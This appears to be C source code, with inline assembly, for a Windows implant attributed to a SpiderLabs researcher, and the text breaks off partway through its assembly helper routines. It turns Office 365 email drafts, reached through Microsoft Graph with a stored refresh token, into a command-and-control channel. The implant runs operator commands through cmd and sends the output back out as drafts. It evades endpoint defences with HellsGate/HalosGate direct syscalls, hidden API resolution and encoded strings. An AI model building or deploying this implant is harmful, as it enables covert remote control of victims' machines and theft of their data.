// Author: Bobby Cooke (0xBoku/boku/boku7) // SpiderLabs // https://twitter.com/0xBoku // github.com/boku7 // https://www.linkedin.com/in/bobby-cooke/ // https://0xboku.com
#include <windows.h>

// Memory Related Definitions
#define BUFSIZE 4096 

// WinInet Definitions
#define INTERNET_SERVICE_HTTP       3
#define INTERNET_OPEN_TYPE_DIRECT   1           // direct to net
#define INTERNET_DEFAULT_HTTP_PORT  80          // HTTP
#define INTERNET_DEFAULT_HTTPS_PORT 443         // HTTPS
#define INTERNET_FLAG_SECURE        0x00800000  // use PCT/SSL if applicable (HTTP)
#define INTERNET_FLAG_DONT_CACHE    0x04000000  // don't write this item to the cache
typedef WORD INTERNET_PORT;
typedef LPVOID HINTERNET;

// HellsGate / HalosGate 
VOID HellsGate( IN WORD wSystemCall);
VOID HellDescent();
DWORD halosGateDown( IN PVOID ntdllApiAddr, IN WORD index);
DWORD halosGateUp( IN PVOID ntdllApiAddr, IN WORD index);
DWORD findSyscallNumber( IN PVOID ntdllApiAddr);

// ASM Function Declaration
PVOID crawlLdrDllList(wchar_t *);
PVOID getExportDirectory(PVOID dllAddr);
PVOID getExportAddressTable(PVOID dllBase, PVOID dllExportDirectory);
PVOID getExportNameTable(PVOID dllBase, PVOID dllExportDirectory);
PVOID getExportOrdinalTable(PVOID dllBase, PVOID dllExportDirectory);
PVOID getNewExeHeader(PVOID dllBase);
PVOID getOptionalHeader(PVOID NewExeHeader);
PVOID getImportDirectory(PVOID OptionalHeader);
PVOID getSymbolAddress(PVOID symbolString, PVOID symbolStringSize, PVOID dllBase, PVOID ExportAddressTable, PVOID ExportNameTable, PVOID ExportOrdinalTable);

// NTDLL.DLL - Function Declaration
typedef NTSTATUS (NTAPI * tNtAllocateVirtualMemory)(HANDLE,PVOID *,ULONG_PTR,PSIZE_T,ULONG,ULONG);

// Kernel32.DLL - Function Declaration
typedef HMODULE (WINAPI * tLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI * tGetProcAddress) (HMODULE,LPCSTR);
typedef BOOL (WINAPI * tCreatePipe)(PHANDLE,PHANDLE,LPSECURITY_ATTRIBUTES,DWORD);
typedef BOOL (WINAPI * tSetHandleInformation)(HANDLE,DWORD,DWORD);
typedef DWORD (WINAPI * tWaitForSingleObject)(HANDLE,DWORD);
typedef BOOL (WINAPI * tCloseHandle)(HANDLE);
typedef WINBOOL (WINAPI * tCreateProcessA)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,WINBOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef VOID (WINAPI * tExitProcess)(UINT);
typedef DWORD (WINAPI * tGetTickCount)(VOID);
typedef VOID (WINAPI * tSleep)(DWORD);
typedef int (WINAPI * tlstrlenA)(LPCSTR);
typedef int (WINAPI * tlstrcmpA)(LPCSTR,LPCSTR);
typedef BOOL (WINAPI * tReadFile)( HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef LPSTR (WINAPI * tlstrcatA)( LPSTR, LPCSTR);

// MSVCRT.DLL
typedef LPSTR (WINAPI *  tstrstr)(const char*, const char*);
typedef int   (WINAPI * tsprintf)(PVOID,const char*, const char*);
typedef PVOID (WINAPI * tmemset)( PVOID, int, size_t);
typedef int   (WINAPI * tatof)(const char *);

// WinINET.DLL - HTTP Request Function Declaration
typedef HINTERNET (WINAPI * tInternetOpenA)(LPCSTR,DWORD,LPCSTR,LPCSTR,DWORD);
typedef HINTERNET (WINAPI * tInternetConnectA)(HANDLE,LPCSTR,INTERNET_PORT,LPCSTR,LPCSTR,DWORD,DWORD,DWORD_PTR);
typedef HINTERNET (WINAPI * tHttpOpenRequestA)(HINTERNET,LPCSTR,LPCSTR,LPCSTR,LPCSTR,LPCSTR*,DWORD,DWORD_PTR);
typedef BOOL (WINAPI * tHttpSendRequestA)(HINTERNET,LPCSTR,DWORD,LPVOID,DWORD);
typedef BOOL (WINAPI * tInternetReadFile)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL (WINAPI * tInternetCloseHandle)(HINTERNET);

typedef struct {
    char* metaCommand;
    char* command;
}metaCommandStruct;

typedef struct {
    tInternetOpenA InternetOpenA;
    tInternetConnectA InternetConnectA;
    tHttpOpenRequestA HttpOpenRequestA;
    tHttpSendRequestA HttpSendRequestA;
    tInternetReadFile InternetReadFile;
    tInternetCloseHandle InternetCloseHandle;
}commsStruct;

typedef struct {
    tLoadLibraryA LoadLibraryA;
    tGetProcAddress GetProcAddress;
    tCreatePipe CreatePipe;
    tSetHandleInformation SetHandleInformation;
    tWaitForSingleObject WaitForSingleObject;
    tCloseHandle CloseHandle;
    tCreateProcessA CreateProcessA;
    tExitProcess ExitProcess;
    tGetTickCount GetTickCount;
    tSleep Sleep;
    tlstrlenA lstrlenA;
    tlstrcmpA lstrcmpA;
    tReadFile ReadFile;
    tlstrcatA lstrcatA;
}k32Struct;

typedef struct {
    tstrstr strstr;
    tsprintf sprintf;
    tmemset memset;
    tatof atof;
}msvcrtStruct;

char* getMsGraphAccessToken(msvcrtStruct strFuncs, commsStruct comms, k32Struct k32, char* sitename, char* clientId, char* tenantId, char* refreshToken, char* user_agent, char* response);
char* getCommandFromDraft(msvcrtStruct strFuncs, commsStruct comms, k32Struct k32, char* accessToken, char* user_agent, char* buff);
char* createEmailDraft(msvcrtStruct strFuncs, commsStruct comms, k32Struct k32, char* accessToken, char* user_agent, char* egressBuffer, char* ingressBuffer);
HANDLE runCommandAsProcess(msvcrtStruct strFuncs, k32Struct k32, char* command);
void ReadFromPipe(k32Struct k32, char* egressBuffer, HANDLE pipeOUT);
void cleanOutput(msvcrtStruct strFuncs, char* buffer);
void parseMetaCommand(msvcrtStruct strFuncs, char* command, metaCommandStruct* commandStruct);

int main() {
    // Variables
    // If compiling to an EXE you can just use the one refreshToken array. If so, comment out rt array and lines 312 to 326
    //char refreshToken[] = "REPLACE THIS";
    // Put the Refresh token in these CHAR arrays. Had to break up the token to different arrays. 
    // If it one massive array GCC ming will put it in the BSS section instead of the TEXT section. This will cause the shellcode creation to fail
    CHAR refreshToken1[] = {''};
    CHAR refreshToken2[] = {''}
    CHAR refreshToken3[] = {''}
    CHAR refreshToken4[] = {''}
    CHAR refreshToken5[] = {''}
    CHAR refreshToken6[] = {''}
    CHAR refreshToken7[] = {''}
    //char tenantId[]     = "REPLACE THIS";
    //char tenantId[]     = "1d5551a0-f4f2-4101-9c3b-394247ec7e08";
    // bobby.cooke$ python3 string2Array.py tenantId "1d5551a0-f4f2-4101-9c3b-394247ec7e08"
    CHAR tenantId[] = {'1','d','5','5','5','1','a','0','-','f','4','f','2','-','4','1','0','1','-','9','c','3','b','-','3','9','4','2','4','7','e','c','7','e','0','8',0};
    DWORD napTime       = 20000; // second sleep
    //char sitename[]     = "login.microsoftonline.com";
    //char sitename[]   = "h1jmj59wadg8l8taczm6fpzolfr5fu.burpcollaborator.net"; 
    CHAR sitename[]     = {'l','o','g','i','n','.','m','i','c','r','o','s','o','f','t','o','n','l','i','n','e','.','c','o','m',0};
    //char clientId[]     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"; // Office 365 Client ID
    CHAR clientId[] = {'d','3','5','9','0','e','d','6','-','5','2','b','3','-','4','1','0','2','-','a','e','f','f','-','a','a','d','2','2','9','2','a','b','0','1','c',0};
    //char user_agent[]   = "Mozilla";
    CHAR user_agent[] = {'M','o','z','i','l','l','a',0};
    //char* sleepStr      = "sleep";
    CHAR sleepStr[] = {'s','l','e','e','p',0};
    //char* shellStr      = "cmd";
    CHAR shellStr[] = {'c','m','d',0};
    //char* exitStr       = "exit";
    CHAR exitStr[] = {'e','x','i','t',0};
    int isShellStr      = 0;
    int isSleepStr      = 0;
    int isExitStr       = 0;
    HANDLE pipeOUT;
    // Ntdll
    // Resolve the addresses of NTDLL from the Loader via GS>TEB>PEB>LDR>InMemoryOrderModuleList
	//   - This is done by matching the first 4 charaters of the DLL BaseName
	// char ntdlStr[] = "ntdl"; // L"ntdll.dll" - Only need the first 4 bytes to find the DLL from the loader list
    CHAR ntdlStr[] = {'n','t','d','l',0};
	PVOID ntdll = (PVOID)crawlLdrDllList((PVOID)ntdlStr);
	PVOID ntdllExportDirectory = getExportDirectory(ntdll);
	PVOID ntdllExAddrTable = getExportAddressTable(ntdll, ntdllExportDirectory);
	PVOID ntdllExNamePointerTable = getExportNameTable(ntdll, ntdllExportDirectory);
	PVOID ntdllExOrdinalTable = getExportOrdinalTable(ntdll, ntdllExportDirectory);
    // char ntAllocVMStr[] = "NtAllocateVirtualMemory";
    CHAR ntAllocVMStr[] = {'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    tNtAllocateVirtualMemory pNtAllocateVirtualMemory = (tNtAllocateVirtualMemory)getSymbolAddress(ntAllocVMStr, (PVOID)sizeof(ntAllocVMStr), ntdll, ntdllExAddrTable, ntdllExNamePointerTable, ntdllExOrdinalTable);
    // HalosGate/HellsGate to get the systemcall number for NtAllocateVirtualMemory from NTDLL.DLL
    DWORD NtAllocateVMSyscall = findSyscallNumber(pNtAllocateVirtualMemory);
	if (NtAllocateVMSyscall == 0) {
		DWORD index = 0;
		while (NtAllocateVMSyscall == 0) {
			index++;
			// Check for unhooked Sycall Above the target stub
			NtAllocateVMSyscall = halosGateUp(pNtAllocateVirtualMemory, index);
			if (NtAllocateVMSyscall) {
				NtAllocateVMSyscall = NtAllocateVMSyscall - index;
				break;
			}
			// Check for unhooked Sycall Below the target stub
			NtAllocateVMSyscall = halosGateDown(pNtAllocateVirtualMemory, index);
			if (NtAllocateVMSyscall) {
				NtAllocateVMSyscall = NtAllocateVMSyscall + index;
				break;
			}
		}
	}
    // Kernel32
    // char kernstr[] = "KERN"; // L"KERNEL32.DLL" - Debugging shows that kernel32 loads in with all uppercase. May need to check for both in future 
    CHAR kernstr[] = {'K','E','R','N',0};
	PVOID kernel32 = (PVOID)crawlLdrDllList((PVOID)kernstr);
	PVOID kernel32ExportDirectory =    getExportDirectory(kernel32);
    kernel32 =  (PVOID)crawlLdrDllList((PVOID)kernstr);
	PVOID kernel32ExAddrTable =        getExportAddressTable(kernel32, kernel32ExportDirectory);
	PVOID kernel32ExNamePointerTable = getExportNameTable(kernel32, kernel32ExportDirectory);
	PVOID kernel32ExOrdinalTable =     getExportOrdinalTable(kernel32, kernel32ExportDirectory);
    k32Struct k32;
    // kernel32.LoadLibrary
	//char loadLibraryAStr[] = "LoadLibraryA";
	// String length : 12
    char loadLibraryAStr[16];
    PVOID loadLibraryAStrLen = (PVOID)12;
	__asm__(
		"mov rsi, %[loadLibraryAStr] \n"
		"mov rdx, 0xFFFFFFFFBE868D9E \n" // NOT Ayra : 41797261
		"mov r11, 0x8D9D96B39B9E90B3 \n" // NOT rbiLdaoL : 7262694c64616f4c
		"not r11 \n"
		"not rdx \n"
		"mov [rsi], r11 \n"
		"mov [rsi+0x8], rdx \n"
		: // no output
		:[loadLibraryAStr] "r" (loadLibraryAStr)
	);
    k32.LoadLibraryA  = (tLoadLibraryA)getSymbolAddress(loadLibraryAStr, loadLibraryAStrLen, kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
    // kernel32.GetProcAddress
    // String length : 14
    char getProcAddrStr[16];
    PVOID getProcAddrStrLen = (PVOID)14;
	__asm__(
		"mov rsi, %[getProcAddrStr] \n"
		"mov rbx, 0xBE9C908DAF8B9AB8 \n" // NOT AcorPteG : 41636f7250746547
		"not rbx \n"
		"mov [rsi], rbx \n"
		"mov rdx, 0xFFFF8C8C9A8D9B9B \n" // NOT sserdd : 737365726464
		"not rdx \n"
		"mov [rsi+0x8], rdx \n"
		: // no output
		:[getProcAddrStr] "r" (getProcAddrStr)
	);
    k32.GetProcAddress = (tGetProcAddress)getSymbolAddress(getProcAddrStr, getProcAddrStrLen, kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
    // kernel32.CreatePipe
    //char CreatePipeStr[] = "CreatePipe";
    CHAR CreatePipeStr[] = {'C','r','e','a','t','e','P','i','p','e',0};
    k32.CreatePipe  = (tCreatePipe)getSymbolAddress(CreatePipeStr, (PVOID)sizeof(CreatePipeStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
    // kernel32.SetHandleInformation
    //char SetHandleInformationStr[] = "SetHandleInformation";
    CHAR SetHandleInformationStr[] = {'S','e','t','H','a','n','d','l','e','I','n','f','o','r','m','a','t','i','o','n',0};
    k32.SetHandleInformation  = (tSetHandleInformation)getSymbolAddress(SetHandleInformationStr, (PVOID)sizeof(SetHandleInformationStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
    // kernel32.WaitForSingleObject
    //char WaitForSingleObjectStr[] = "WaitForSingleObject";
    CHAR WaitForSingleObjectStr[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0};
    k32.WaitForSingleObject  = (tWaitForSingleObject)getSymbolAddress(WaitForSingleObjectStr, (PVOID)sizeof(WaitForSingleObjectStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
    // kernel32.CloseHandle
    //char CloseHandleStr[] = "CloseHandle";
    CHAR CloseHandleStr[] = {'C','l','o','s','e','H','a','n','d','l','e',0};
    k32.CloseHandle  = (tCloseHandle)getSymbolAddress(CloseHandleStr, (PVOID)sizeof(CloseHandleStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
    // kernel32.CreateProcessA
    //char CreateProcessAStr[] = "CreateProcessA";
    CHAR CreateProcessAStr[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0};
    k32.CreateProcessA  = (tCreateProcessA)getSymbolAddress(CreateProcessAStr, (PVOID)sizeof(CreateProcessAStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
    // kernel32.ExitProcess
    //char ExitProcessStr[] = "ExitProcess";
    CHAR ExitProcessStr[] = {'E','x','i','t','P','r','o','c','e','s','s',0};
    k32.ExitProcess  = (tExitProcess)getSymbolAddress(ExitProcessStr, (PVOID)sizeof(ExitProcessStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
    // kernel32.GetTickCount
    //char GetTickCountStr[] = "GetTickCount";
    CHAR GetTickCountStr[] = {'G','e','t','T','i','c','k','C','o','u','n','t',0}; 
    k32.GetTickCount  = (tGetTickCount)getSymbolAddress(GetTickCountStr, (PVOID)sizeof(GetTickCountStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
    // kernel32.Sleep
    //char SleepStr[] = "Sleep";
    CHAR SleepStr[] = {'S','l','e','e','p',0}; 
    k32.Sleep  = (tSleep)getSymbolAddress(SleepStr, (PVOID)sizeof(SleepStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
    // kernel32.ReadFile
    //char ReadFileStr[] = "ReadFile";
    CHAR ReadFileStr[] = {'R','e','a','d','F','i','l','e',0}; 
    k32.ReadFile  = (tReadFile)getSymbolAddress(ReadFileStr, (PVOID)sizeof(ReadFileStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
    // kernel32.lstrlenA
    //char lstrlenAStr[] = "lstrlenA";
    CHAR lstrlenAStr[] = {'l','s','t','r','l','e','n','A',0}; 
    k32.lstrlenA  = (tlstrlenA)getSymbolAddress(lstrlenAStr, (PVOID)sizeof(lstrlenAStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable); 
    // kernel32.lstrcmpA
    //char lstrcmpAStr[] = "lstrcmpA";
    CHAR lstrcmpAStr[] = {'l','s','t','r','c','m','p','A',0}; 
    k32.lstrcmpA  = (tlstrcmpA)getSymbolAddress(lstrcmpAStr, (PVOID)sizeof(lstrcmpAStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable); 
    // kernel32.lstrcatA
    //char lstrcatAStr[] = "lstrcatA";
    CHAR lstrcatAStr[] = {'l','s','t','r','c','a','t','A',0};
    k32.lstrcatA  = (tlstrcatA)getSymbolAddress(lstrcatAStr, (PVOID)sizeof(lstrcatAStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable); 
   // msvcrt.dll
    CHAR msvcrtStr[] = {'m','s','v','c','r','t','.','d','l','l',0};;
    HMODULE msvcrt = k32.LoadLibraryA((LPCSTR)msvcrtStr);
    PVOID msvcrtExportDirectory =    getExportDirectory(msvcrt);
	PVOID msvcrtExAddrTable =        getExportAddressTable(msvcrt, msvcrtExportDirectory);
	PVOID msvcrtExNamePointerTable = getExportNameTable(msvcrt, msvcrtExportDirectory);
	PVOID msvcrtExOrdinalTable =     getExportOrdinalTable(msvcrt, msvcrtExportDirectory);
    // msvcrt functions
    msvcrtStruct strFuncs;
    char strstrStr[]  = {'s','t','r','s','t','r',0};
    strFuncs.strstr   = (tstrstr)getSymbolAddress(strstrStr, (PVOID)sizeof(strstrStr), msvcrt, msvcrtExAddrTable, msvcrtExNamePointerTable, msvcrtExOrdinalTable);
    char sprintfStr[] = {'s','p','r','i','n','t','f',0};
    strFuncs.sprintf  = (tsprintf)getSymbolAddress(sprintfStr, (PVOID)sizeof(sprintfStr), msvcrt, msvcrtExAddrTable, msvcrtExNamePointerTable, msvcrtExOrdinalTable);
    char memsetStr[]  = {'m','e','m','s','e','t',0};
    strFuncs.memset   = (tmemset)getSymbolAddress(memsetStr, (PVOID)sizeof(memsetStr), msvcrt, msvcrtExAddrTable, msvcrtExNamePointerTable, msvcrtExOrdinalTable);
    char atofStr[]    = {'a','t','o','f',0};
    strFuncs.atof     = (tatof)getSymbolAddress(atofStr, (PVOID)sizeof(atofStr), msvcrt, msvcrtExAddrTable, msvcrtExNamePointerTable, msvcrtExOrdinalTable);
    // wininet functions
    CHAR wininetStr[] = {'w','i','n','i','n','e','t','.','d','l','l',0};
    HMODULE wininet = k32.LoadLibraryA((LPCSTR)wininetStr);
    PVOID wininetExportDirectory =    getExportDirectory(wininet);
	PVOID wininetExAddrTable =        getExportAddressTable(wininet, wininetExportDirectory);
	PVOID wininetExNamePointerTable = getExportNameTable(wininet, wininetExportDirectory);
	PVOID wininetExOrdinalTable =     getExportOrdinalTable(wininet, wininetExportDirectory);
    // wininet functions
    commsStruct comms;
    char InternetOpenAStr[] = {'I','n','t','e','r','n','e','t','O','p','e','n','A',0};
    comms.InternetOpenA = (tInternetOpenA)getSymbolAddress(InternetOpenAStr, (PVOID)sizeof(InternetOpenAStr), wininet, wininetExAddrTable, wininetExNamePointerTable, wininetExOrdinalTable);
    char InternetConnectAStr[] = {'I','n','t','e','r','n','e','t','C','o','n','n','e','c','t','A',0};
    comms.InternetConnectA = (tInternetConnectA)getSymbolAddress(InternetConnectAStr, (PVOID)sizeof(InternetConnectAStr), wininet, wininetExAddrTable, wininetExNamePointerTable, wininetExOrdinalTable);
    char HttpOpenRequestAStr[] = {'H','t','t','p','O','p','e','n','R','e','q','u','e','s','t','A',0};
    comms.HttpOpenRequestA = (tHttpOpenRequestA)getSymbolAddress(HttpOpenRequestAStr, (PVOID)sizeof(HttpOpenRequestAStr), wininet, wininetExAddrTable, wininetExNamePointerTable, wininetExOrdinalTable);
    char HttpSendRequestAStr[] = {'H','t','t','p','S','e','n','d','R','e','q','u','e','s','t','A',0};
    comms.HttpSendRequestA = (tHttpSendRequestA)getSymbolAddress(HttpSendRequestAStr, (PVOID)sizeof(HttpSendRequestAStr), wininet, wininetExAddrTable, wininetExNamePointerTable, wininetExOrdinalTable);
    char InternetReadFileStr[] = {'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e',0};
    comms.InternetReadFile = (tInternetReadFile)getSymbolAddress(InternetReadFileStr, (PVOID)sizeof(InternetReadFileStr), wininet, wininetExAddrTable, wininetExNamePointerTable, wininetExOrdinalTable);
    char InternetCloseHandleStr[] = {'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e',0};
    comms.InternetCloseHandle = (tInternetCloseHandle)getSymbolAddress(InternetCloseHandleStr, (PVOID)sizeof(InternetCloseHandleStr), wininet, wininetExAddrTable, wininetExNamePointerTable, wininetExOrdinalTable);
    // Allocate Memory Buffers
    // Allocate refreshToken
	ULONG rtBuffSize = 1 << 13;
	PVOID refreshToken = NULL;
	SIZE_T refreshTokenSize = (SIZE_T)rtBuffSize;
    // NtAllocateVirtualMemory via HellsGate & HalosGate
    HellsGate(NtAllocateVMSyscall);
    HellDescent((HANDLE)-1, &refreshToken, 0, &refreshTokenSize, MEM_COMMIT, PAGE_READWRITE);
    strFuncs.memset(refreshToken, 0, refreshTokenSize);
    k32.lstrcatA(refreshToken,refreshToken1);
    k32.lstrcatA(refreshToken,refreshToken2);
    k32.lstrcatA(refreshToken,refreshToken3);
    k32.lstrcatA(refreshToken,refreshToken4);
    k32.lstrcatA(refreshToken,refreshToken5);
    k32.lstrcatA(refreshToken,refreshToken6);
    k32.lstrcatA(refreshToken,refreshToken7);
    // Allocate AccessToken
	ULONG atBuffSize = 1 << 13;
	PVOID accessTokenBuffer = NULL;
	SIZE_T accessTokenBufferSize = (SIZE_T)atBuffSize;
    //char* accessTokenBuffer = VirtualAlloc(0, 100000, MEM_COMMIT, PAGE_READWRITE);
    //__debugbreak();
    // NtAllocateVirtualMemory via HellsGate & HalosGate
    HellsGate(NtAllocateVMSyscall);
    HellDescent((HANDLE)-1, &accessTokenBuffer, 0, &accessTokenBufferSize, MEM_COMMIT, PAGE_READWRITE);
    // Allocate Ingress Buffer
    // char* ingressBuffer     = VirtualAlloc(0, 100000, MEM_COMMIT, PAGE_READWRITE);
    ULONG inBuffSize = 1 << 16;
	PVOID ingressBuffer = NULL;
	SIZE_T ingressBufferSize = (SIZE_T)inBuffSize;
    // NtAllocateVirtualMemory via HellsGate & HalosGate
    HellsGate(NtAllocateVMSyscall);
    HellDescent((HANDLE)-1, &ingressBuffer, 0, &ingressBufferSize, MEM_COMMIT, PAGE_READWRITE);
    // Allocate Egress Buffer
    // char* egressBuffer      = VirtualAlloc(0, 100000, MEM_COMMIT, PAGE_READWRITE);
    ULONG outBuffSize = 1 << 16;
	PVOID egressBuffer = NULL;
	SIZE_T egressBufferSize = (SIZE_T)outBuffSize;
    // NtAllocateVirtualMemory via HellsGate & HalosGate
    HellsGate(NtAllocateVMSyscall);
    HellDescent((HANDLE)-1, &egressBuffer, 0, &egressBufferSize, MEM_COMMIT, PAGE_READWRITE);
    // While Loop Memory Pointers
    char* accessToken;
    char* command;
    char* sendDraftResponse;
    // Get Access Token from Refresh Token
    strFuncs.memset(accessTokenBuffer, 0, accessTokenBufferSize);
    accessToken = getMsGraphAccessToken(strFuncs, comms, k32, sitename, clientId, tenantId, refreshToken, user_agent, (char*)accessTokenBuffer);
    // https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount
    // Get a new Access Token every 15 minutes / 900 seconds / 900,000 milliseconds
    DWORD tokenRefreshInterval = 900000; // Change this to modify how frequently this gets a new Access Token
    DWORD AccessTokenTimeStamp = k32.GetTickCount();
    DWORD TimeToGetNewToken    = AccessTokenTimeStamp + tokenRefreshInterval;
    DWORD CurrentTimeStamp     = 0;
    while (1)
    {
        if (accessToken == NULL)
        {
            k32.Sleep(180000);   // If AccessToken is NULL, then the internet connection probably failed. Sleep for 3 minutes and try again.
            strFuncs.memset(accessTokenBuffer, 0,accessTokenBufferSize);
            accessToken      = getMsGraphAccessToken(strFuncs, comms, k32, sitename, clientId, tenantId, refreshToken, user_agent, (char*)accessTokenBuffer);
        }
        // Checks if its time to get a new Access Token. If True, gets new Access Token for C2 comms
        CurrentTimeStamp     = k32.GetTickCount(); // Get the Current time as tickcount and see if its time for a new token
        if (CurrentTimeStamp > TimeToGetNewToken)
        {
            strFuncs.memset(accessTokenBuffer, 0, accessTokenBufferSize);
            accessToken          = getMsGraphAccessToken(strFuncs, comms, k32, sitename, clientId, tenantId, refreshToken, user_agent, (char*)accessTokenBuffer);
            AccessTokenTimeStamp = k32.GetTickCount();
            TimeToGetNewToken    = AccessTokenTimeStamp + tokenRefreshInterval;
        }
        // Clear the input & output buffers to avoid currupted strings from last buffer
        strFuncs.memset(ingressBuffer, 0, inBuffSize);
        strFuncs.memset(egressBuffer, 0,  outBuffSize);
        // Get the command from the most recent draft email
        if (accessToken != NULL)
        {
            command = getCommandFromDraft(strFuncs, comms, k32, accessToken, user_agent, ingressBuffer);
        }
        else
        {
            strFuncs.memset(ingressBuffer, 0, inBuffSize);
            command = ingressBuffer;
        }
        // Check if Command is empty/blank. If not then do something
        if (command[0] != 0x00)
        {
            // Get the meta command and command from the parsed draft message
            metaCommandStruct commandStruct;
            parseMetaCommand(strFuncs, command, &commandStruct);
            // Check if the meta command is "sleep"
            isShellStr = k32.lstrcmpA(commandStruct.metaCommand, shellStr);
            if (isShellStr == 0)
            {
                pipeOUT = runCommandAsProcess(strFuncs, k32,commandStruct.command);
                ReadFromPipe(k32, egressBuffer, pipeOUT);
            }
            // MetaCommand handler for Sleep/naptime
            isSleepStr = k32.lstrcmpA(commandStruct.metaCommand, sleepStr);
            if (isSleepStr == 0)
            {
                napTime = (DWORD)strFuncs.atof(commandStruct.command); // String to DWORD 
            }
            // Check if the meta command is "exit"
            isExitStr = k32.lstrcmpA(commandStruct.metaCommand, exitStr);
            if (isExitStr == 0)
            {
                // Create another draft email so it doesnt get stuck if rerunning
                strFuncs.memset(ingressBuffer, 0, inBuffSize);
                strFuncs.memset(egressBuffer, 0, outBuffSize);
                sendDraftResponse = createEmailDraft(strFuncs, comms, k32, accessToken, user_agent, egressBuffer, ingressBuffer);
                k32.ExitProcess(0); // exits the process if meta command is "exit"
            }
            // Remove  " \ because they will break the JSON 
            cleanOutput(strFuncs,egressBuffer);
            // Send out via Draft Email
            strFuncs.memset(ingressBuffer, 0, inBuffSize);
            sendDraftResponse = createEmailDraft(strFuncs, comms, k32, accessToken, user_agent, egressBuffer, ingressBuffer);
            // Create another draft email so drafts are ready for next input and for logging of exfil 
            strFuncs.memset(ingressBuffer, 0, inBuffSize);
            strFuncs.memset(egressBuffer,  0, outBuffSize);
            if (sendDraftResponse != NULL)
            {
                sendDraftResponse = createEmailDraft(strFuncs, comms, k32, accessToken, user_agent, egressBuffer, ingressBuffer);
            }
        }
        k32.Sleep(napTime);
    }
    return 0;
}

// Takes in the 4 first for unicode characters (8 bytes) of a DLL and returns the base address of that DLL module if it is already loaded into memory
// PVOID crawlLdrDllList(wchar_t * dllName)
__asm__(
"crawlLdrDllList: \n"
	"xor rax, rax \n"             // RAX = 0x0
// Check if dllName string is ASCII or Unicode
	"mov rcx, [rcx] \n"           // RCX = First 8 bytes of string 
	"cmp ch, al \n"               // Unicode then jump, else change ASCII to Unicode 4 bytes
	"je getMemList \n"
	"movq mm1, rcx \n"            // MMX1 contains first 8 ASCII Chars
	"psllq mm1, 0x20 \n"          // Set MMX1 to unpack first 4 bytes of Unicode string
	"pxor mm2, mm2 \n"            // NULL out MMX2 Register
	"punpckhbw mm1, mm2 \n"       // convert ASCII to Unicode and save first 4 bytes in MMX1
	"movq rcx, mm1 \n"            // RCX = first 4 Unicode chars (8bytes)
"getMemList:"
	"mov rbx, gs:[rax+0x60] \n"   // RBX = ProcessEnvironmentBlock // GS = TEB
	"mov rbx, [rbx+0x18] \n"      // RBX = _PEB_LDR_DATA
	"mov rbx, [rbx+0x20] \n"      // RBX = InMemoryOrderModuleList - First Entry (probably the host PE File)
	"mov r11, rbx \n" 
"crawl: \n"
	"mov rax, [rbx+0x50] \n"      // RAX = BaseDllName Buffer - The actual Unicode bytes of the string (we skip the first 8 bytes of the _UNICODE_STRING struct to get the pointer to the buffer)
	"mov rax, [rax] \n"           // RAX = First 4 Unicode bytes of the DLL string from the Ldr List
	"cmp rax, rcx \n"
	"je found \n"
	"mov rbx, [rbx] \n"           // RBX = InMemoryOrderLinks Next Entry
	"cmp r11, [rbx] \n"           // Are we back at the same entry in the list?
	"jne crawl \n"
	"xor rax, rax \n"// DLL is not in InMemoryOrderModuleList, return NULL
	"jmp end \n"
"found: \n"
	"mov rax, [rbx+0x20] \n" // [rbx+0x20] = DllBase Address in process memory
"end: \n"
	"ret \n"
);
// Takes in the address of a DLL in memory and returns the DLL's Export Directory Address
//PVOID getExportDirectory(PVOID dllBase)
__asm__(
"getExportDirectory: \n"
	"mov r8, rcx \n"
	"mov ebx, [rcx+0x3C] \n"
	"add rbx, r8 \n"
	"xor rcx, rcx \n"
	"add cx, 0x88 \n"
	"mov eax, [rbx+rcx] \n"
	"add rax, r8 \n"
	"ret \n" // return ExportDirectory;
);
// Return the address of the Export Address Table
// PVOID getExportAddressTable(PVOID dllBase, PVOID ExportDirectory)
//                                    RCX              RDX
__asm__(
"getExportAddressTable: \n"
	"xor rax, rax \n"
	"add rdx, 0x1C \n"         // DWORD AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
	"mov eax, [rdx] \n"        // RAX = RVAExportAddressTable (Value/RVA)
	"add rax, rcx \n"          // RAX = VA ExportAddressTable (The address of the Export table in running memory of the process)
	"ret \n" // return ExportAddressTable
);
// Return the address of the Export Name Table
// PVOID getExportNameTable(PVOID dllBase, PVOID ExportDirectory)
//                                 RCX              RDX
__asm__(
"getExportNameTable: \n"
	"xor rax, rax \n"
	"add rdx, 0x20 \n"         // DWORD AddressOfFunctions; // 0x20 offset 
